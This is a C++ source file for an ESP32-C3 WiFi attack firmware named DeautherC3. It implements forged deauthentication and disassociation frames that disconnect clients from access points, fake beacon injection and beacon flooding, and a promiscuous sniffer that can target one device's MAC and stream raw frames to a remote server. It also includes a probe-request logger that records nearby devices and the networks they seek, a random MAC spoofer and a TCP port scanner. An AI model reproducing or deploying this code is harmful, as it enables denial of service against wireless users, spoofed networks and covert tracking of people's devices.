// wifi_utils.cpp - Expanded WiFi utilities for DeautherC3
// Added: Sniffer, Beacon Flood, Probe Request Sniffer, Channel Hopper, Packet Streaming
#include "wifi_utils.h"
#include "packet_streamer.h"

// Static instance for callback access
WiFi_Utils* WiFi_Utils::instance_ = NULL;

WiFi_Utils::WiFi_Utils(bool random_mac) : random_mac_enable(random_mac)
{
  instance_ = this;
  memset(filter_mac_, 0, 6);
  filter_enabled_ = false;
}

bool WiFi_Utils::init()
{
  if (random_mac_enable)
  {
    isInit = changeMACAddress();
  }
  else
  {
    isInit = true;
  }
  return isInit;
}

bool WiFi_Utils::changeMACAddress()
{
  uint8_t mac[6];
  randomSeed(analogRead(0));
  for (int i = 0; i < 6; i++)
  {
    mac[i] = random(0, 256);
  }
  mac[0] = (mac[0] & 0xFC) | 0x02;  // Locally administered bit
  WiFi.mode(WIFI_STA);
  if (esp_wifi_set_mac(WIFI_IF_STA, mac) == ESP_OK)
  {
    mac_address = WiFi.macAddress().c_str();
    return true;
  }
  return false;
}

wifiData WiFi_Utils::scanWifiList()
{
  wifiData wifi_;
  // Keep AP alive — use AP_STA instead of STA-only
  WiFi.mode(WIFI_AP_STA);
  int numWifi = WiFi.scanNetworks();
  wifi_.num = numWifi;
  for (int i = 0; i < numWifi; i++)
  {
    wifi_.ssid.push_back(std::string(WiFi.SSID(i).c_str()));
    wifi_.bssid.push_back(std::string(WiFi.BSSIDstr(i).c_str()));
    wifi_.channel.push_back(WiFi.channel(i));
    wifi_.signal.push_back(WiFi.RSSI(i));
  }
  return wifi_;
}

bool WiFi_Utils::connectToWifi(std::string SSID, std::string PASSWORD, std::string HOSTNAME, const int MAX_ATTEMPTS,
                               const int TRIAL_DELAY)
{
  WiFi.mode(WIFI_AP_STA);
  WiFi.config(INADDR_NONE, INADDR_NONE, INADDR_NONE, INADDR_NONE);
  WiFi.setHostname(HOSTNAME.c_str());
  WiFi.begin(SSID.c_str(), PASSWORD.c_str());
  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < MAX_ATTEMPTS)
  {
    delay(TRIAL_DELAY);
    attempts++;
  }
  return (WiFi.status() == WL_CONNECTED);
}

bool WiFi_Utils::scanSinglePort(IPAddress ip, int port, int timeout_ms)
{
  WiFiClient client;
  client.setTimeout(timeout_ms);
  if (client.connect(ip, port))
  {
    client.stop();
    return true;
  }
  return false;
}

std::vector<int> WiFi_Utils::scanPortsInRange(IPAddress ip, int startPort, int endPort, int timeout_ms)
{
  std::vector<int> openPorts;
  for (int port = startPort; port <= endPort; ++port)
  {
    if (scanSinglePort(ip, port, timeout_ms))
    {
      openPorts.push_back(port);
    }
    delay(50);
  }
  return openPorts;
}

// === Deauth Attack ===
// Send deauth (0xC0) and disassociate (0xA0) frames in both directions
// dir=0: AP->client (addr1=client/broadcast, addr2=BSSID, addr3=BSSID)
// dir=1: client->AP (addr1=BSSID, addr2=client/broadcast, addr3=BSSID)
void WiFi_Utils::sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta)
{
  struct
  {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence_control[2];
    uint8_t reason_code[2];
  } __attribute__((packed)) deauth_frame;

  // === Deauth frame: AP -> Client (broadcast) ===
  deauth_frame.frame_control[0] = 0xC0;  // Deauth
  deauth_frame.frame_control[1] = 0x00;
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  memcpy(deauth_frame.addr1, sta, 6);    // Destination = client/broadcast
  memcpy(deauth_frame.addr2, bssid, 6);  // Source = AP
  memcpy(deauth_frame.addr3, bssid, 6);  // BSSID
  deauth_frame.sequence_control[0] = 0x00;
  deauth_frame.sequence_control[1] = 0x00;
  deauth_frame.reason_code[0] = 0x07;    // Class 3 frame received from nonassociated station
  deauth_frame.reason_code[1] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);

  // === Disassociate frame: AP -> Client (broadcast) ===
  deauth_frame.frame_control[0] = 0xA0;  // Disassociate
  deauth_frame.reason_code[0] = 0x07;
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);

  // === Deauth frame: Client -> AP (reverse direction) ===
  deauth_frame.frame_control[0] = 0xC0;  // Deauth
  memcpy(deauth_frame.addr1, bssid, 6);  // Destination = AP
  memcpy(deauth_frame.addr2, sta, 6);    // Source = client/broadcast
  memcpy(deauth_frame.addr3, bssid, 6);  // BSSID
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);

  // === Disassociate frame: Client -> AP (reverse direction) ===
  deauth_frame.frame_control[0] = 0xA0;  // Disassociate
  esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&deauth_frame, sizeof(deauth_frame), true);
  Serial.printf("[SEND] Deauth/Disassoc sent\n");
}

// === Beacon Frame Injection ===
void WiFi_Utils::sendBeaconFrame(const char* ssid, const uint8_t* bssid, uint8_t channel)
{
  int ssid_len = strlen(ssid);
  int frame_size = 24 + 12 + (2 + ssid_len) + 3 + 10;

  uint8_t* frame = new uint8_t[frame_size];
  memset(frame, 0, frame_size);

  // Frame control: Management frame, subtype=Beacon (0x0080)
  frame[0] = 0x80;
  frame[1] = 0x00;
  frame[2] = 0x00;
  frame[3] = 0x00;

  // addr1 = broadcast (DA)
  for (int i = 0; i < 6; i++) frame[4 + i] = 0xFF;
  // addr2 = BSSID (SA)
  memcpy(&frame[10], bssid, 6);
  // addr3 = BSSID
  memcpy(&frame[16], bssid, 6);
  // Sequence control
  frame[22] = 0x00;
  frame[23] = 0x00;

  // Fixed fields (offset 24)
  uint64_t fake_ts = esp_timer_get_time();
  memcpy(&frame[24], &fake_ts, 8);
  frame[32] = 0x64;  // Beacon interval = 100 TU
  frame[33] = 0x00;
  frame[34] = 0x01;  // Capability: ESS
  frame[35] = 0x00;

  // Tagged parameters (offset 36)
  int tag_offset = 36;
  // SSID tag
  frame[tag_offset] = 0x00;
  frame[tag_offset + 1] = ssid_len;
  memcpy(&frame[tag_offset + 2], ssid, ssid_len);
  tag_offset += 2 + ssid_len;

  // DS Parameter Set (channel)
  frame[tag_offset] = 0x03;
  frame[tag_offset + 1] = 0x01;
  frame[tag_offset + 2] = channel;
  tag_offset += 3;

  // Supported rates
  frame[tag_offset] = 0x01;
  frame[tag_offset + 1] = 0x08;
  frame[tag_offset + 2] = 0x82;
  frame[tag_offset + 3] = 0x84;
  frame[tag_offset + 4] = 0x0B;
  frame[tag_offset + 5] = 0x16;
  frame[tag_offset + 6] = 0x0C;
  frame[tag_offset + 7] = 0x12;
  frame[tag_offset + 8] = 0x18;
  frame[tag_offset + 9] = 0x24;

  esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_size, true);
  delete[] frame;
  Serial.printf("[BEACON] Sent: \"%s\" ch=%d\n", ssid, channel);
}

// === Sniffer (Promiscuous Mode) ===
void WiFi_Utils::snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (instance_ == NULL) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  uint16_t frame_len = pkt->rx_ctrl.sig_len;

  if (frame_len < 24) return;

  uint8_t fc0 = frame[0];
  uint8_t frame_type = (fc0 & 0x0C) >> 2;
  uint8_t frame_subtype = (fc0 & 0xF0) >> 4;

  instance_->sniffer_stats_.total_frames++;
  instance_->sniffer_stats_.last_frame_type = frame_type;
  instance_->sniffer_stats_.last_frame_subtype = frame_subtype;

  char src_mac[18];
  snprintf(src_mac, sizeof(src_mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);
  instance_->sniffer_stats_.last_src_mac = std::string(src_mac);

  char dst_mac[18];
  snprintf(dst_mac, sizeof(dst_mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           frame[4], frame[5], frame[6], frame[7], frame[8], frame[9]);
  instance_->sniffer_stats_.last_dst_mac = std::string(dst_mac);

  switch (frame_type)
  {
    case 0:  instance_->sniffer_stats_.mgmt_frames++; break;
    case 1:  instance_->sniffer_stats_.ctrl_frames++; break;
    case 2:  instance_->sniffer_stats_.data_frames++; break;
  }

  // Push raw frame to packet streamer for remote server
  if (instance_->packet_streamer_ != NULL) {
    // Apply MAC filter if enabled: only forward frames involving filter_mac_
    if (instance_->filter_enabled_) {
      // addr1 = dst (offset 4-9), addr2 = src (offset 10-15)
      bool src_match = (memcmp(&frame[10], instance_->filter_mac_, 6) == 0);
      bool dst_match = (memcmp(&frame[4],  instance_->filter_mac_, 6) == 0);
      if (!src_match && !dst_match) return;  // Not our target device, skip
    }

    int8_t rssi = pkt->rx_ctrl.rssi;
    uint8_t ch = pkt->rx_ctrl.channel;
    instance_->packet_streamer_->pushPacket(frame, frame_len, ch, rssi);
  }
}

void WiFi_Utils::startSniffer(uint8_t channel)
{
  if (sniffer_active_) return;
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  sniffer_channel_ = channel;

  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_CTRL
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  sniffer_active_ = true;
  Serial.printf("[SNIFFER] Started on channel %d\n", channel);
}

void WiFi_Utils::stopSniffer()
{
  if (!sniffer_active_) return;
  esp_wifi_set_promiscuous(false);
  sniffer_active_ = false;
  Serial.println("[SNIFFER] Stopped");
}

bool WiFi_Utils::isSniffing() { return sniffer_active_; }
snifferStats WiFi_Utils::getSnifferStats() { return sniffer_stats_; }

void WiFi_Utils::resetSnifferStats()
{
  sniffer_stats_.total_frames = 0;
  sniffer_stats_.mgmt_frames = 0;
  sniffer_stats_.data_frames = 0;
  sniffer_stats_.ctrl_frames = 0;
  sniffer_stats_.probe_req_frames = 0;
  sniffer_stats_.last_src_mac = "";
  sniffer_stats_.last_dst_mac = "";
}

// === Probe Request Sniffer ===
void WiFi_Utils::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (instance_ == NULL) return;
  if (type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  uint16_t frame_len = pkt->rx_ctrl.sig_len;

  if (frame_len < 24) return;

  uint8_t frame_type = (frame[0] & 0x0C) >> 2;
  uint8_t frame_subtype = (frame[0] & 0xF0) >> 4;
  if (frame_type != 0 || frame_subtype != 4) return;

  instance_->sniffer_stats_.probe_req_frames++;

  char client_mac[18];
  snprintf(client_mac, sizeof(client_mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

  std::string ssid_str = "";
  if (frame_len > 26)
  {
    int offset = 24;
    while (offset + 2 <= frame_len)
    {
      uint8_t tag_id = frame[offset];
      uint8_t tag_len = frame[offset + 1];
      if (tag_id == 0 && tag_len > 0 && offset + 2 + tag_len <= frame_len)
      {
        ssid_str = std::string((const char*)&frame[offset + 2], tag_len);
        break;
      }
      offset += 2 + tag_len;
      if (tag_len == 0) break;
    }
  }

  bool found = false;
  for (int i = 0; i < instance_->probe_data_.num; i++)
  {
    if (instance_->probe_data_.client_mac[i] == std::string(client_mac))
    {
      instance_->probe_data_.count[i]++;
      if (ssid_str.length() > 0 && instance_->probe_data_.ssid[i] == "")
      {
        instance_->probe_data_.ssid[i] = ssid_str;
      }
      found = true;
      break;
    }
  }

  if (!found && instance_->probe_data_.num < 20)
  {
    instance_->probe_data_.client_mac.push_back(std::string(client_mac));
    instance_->probe_data_.ssid.push_back(ssid_str);
    instance_->probe_data_.channel.push_back(pkt->rx_ctrl.channel);
    instance_->probe_data_.count.push_back(1);
    instance_->probe_data_.num++;
  }
}

void WiFi_Utils::startProbeSniffer(uint8_t channel)
{
  if (probe_sniffer_active_) return;
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

  wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
  };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(probeSnifferCallback);
  esp_wifi_set_promiscuous(true);
  probe_sniffer_active_ = true;
  Serial.printf("[PROBE] Started on channel %d\n", channel);
}

void WiFi_Utils::stopProbeSniffer()
{
  if (!probe_sniffer_active_) return;
  esp_wifi_set_promiscuous(false);
  probe_sniffer_active_ = false;
  Serial.println("[PROBE] Stopped");
}

bool WiFi_Utils::isProbeSniffing() { return probe_sniffer_active_; }
probeData WiFi_Utils::getProbeData() { return probe_data_; }

void WiFi_Utils::resetProbeData()
{
  probe_data_.num = 0;
  probe_data_.client_mac.clear();
  probe_data_.ssid.clear();
  probe_data_.channel.clear();
  probe_data_.count.clear();
}

// === Channel Control ===
void WiFi_Utils::setChannel(uint8_t channel)
{
  current_channel_ = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void WiFi_Utils::startChannelHopper()
{
  channel_hopping_ = true;
  current_channel_ = 1;
  last_hop_time_ = millis();
  Serial.println("[HOPPER] Started (1-13)");
}

void WiFi_Utils::stopChannelHopper()
{
  channel_hopping_ = false;
  Serial.println("[HOPPER] Stopped");
}

bool WiFi_Utils::isChannelHopping() { return channel_hopping_; }
uint8_t WiFi_Utils::getCurrentChannel() { return current_channel_; }

// Auto-hop in main loop - call every iteration
void WiFi_Utils::hopChannel()
{
  if (!channel_hopping_) return;
  unsigned long now = millis();
  if (now - last_hop_time_ >= 500)
  {
    current_channel_ = (current_channel_ % 13) + 1;
    esp_wifi_set_channel(current_channel_, WIFI_SECOND_CHAN_NONE);
    last_hop_time_ = now;
  }
}

// === Beacon Flood ===
void WiFi_Utils::startBeaconFlood(uint8_t channel)
{
  beacon_flood_active_ = true;
  beacon_flood_channel_ = channel;
  beacon_flood_count_ = 0;
  Serial.printf("[BEACON] Flood started on channel %d\n", channel);
}

void WiFi_Utils::stopBeaconFlood()
{
  beacon_flood_active_ = false;
  Serial.println("[BEACON] Flood stopped");
}

bool WiFi_Utils::isBeaconFlooding() { return beacon_flood_active_; }
uint32_t WiFi_Utils::getBeaconFloodCount() { return beacon_flood_count_; }

void WiFi_Utils::incrementBeaconFloodCount() { beacon_flood_count_++; }

// === Packet Streamer ===
void WiFi_Utils::setPacketStreamer(PacketStreamer* streamer) {
  packet_streamer_ = streamer;
}
PacketStreamer* WiFi_Utils::getPacketStreamer() {
  return packet_streamer_;
}

std::string WiFi_Utils::macAddress()
{
  return mac_address;
}

// === Sniffer MAC Filter ===
void WiFi_Utils::setSnifferFilter(const uint8_t* mac)
{
  memcpy(filter_mac_, mac, 6);
  filter_enabled_ = true;
  Serial.printf("[FILTER] Set to %02X:%02X:%02X:%02X:%02X:%02X\n",
    filter_mac_[0], filter_mac_[1], filter_mac_[2],
    filter_mac_[3], filter_mac_[4], filter_mac_[5]);
}

void WiFi_Utils::setSnifferFilterFromStr(const char* mac_str)
{
  uint8_t mac[6];
  if (sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6) {
    setSnifferFilter(mac);
  } else {
    Serial.printf("[FILTER] Invalid MAC: %s\n", mac_str);
  }
}

void WiFi_Utils::clearSnifferFilter()
{
  filter_enabled_ = false;
  memset(filter_mac_, 0, 6);
  Serial.println("[FILTER] Cleared");
}

bool WiFi_Utils::isSnifferFiltered() { return filter_enabled_; }

const uint8_t* WiFi_Utils::getSnifferFilterMac() { return filter_mac_; }

void WiFi_Utils::getSnifferFilterMacStr(char* out, size_t len)
{
  snprintf(out, len, "%02X:%02X:%02X:%02X:%02X:%02X",
    filter_mac_[0], filter_mac_[1], filter_mac_[2],
    filter_mac_[3], filter_mac_[4], filter_mac_[5]);
}
